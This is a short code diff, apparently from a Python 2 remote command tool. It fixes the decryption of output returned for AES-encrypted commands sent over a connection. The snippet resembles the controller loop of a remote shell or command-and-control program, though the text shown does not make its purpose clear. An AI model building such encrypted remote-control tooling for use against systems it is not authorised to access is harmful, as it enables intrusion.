@@ -529,7 +529,7 @@ while True:
                 send_one_message(conn, cmd_AES.encrypt(cmd))
 
                 eoutput = recv_one_message(conn)
-                output = send_file_aes.decrypt(eoutput, cmd_AES.get_key())
+                output = cmd_AES.decrypt(eoutput, cmd_AES.get_key())
 
                 print output
 
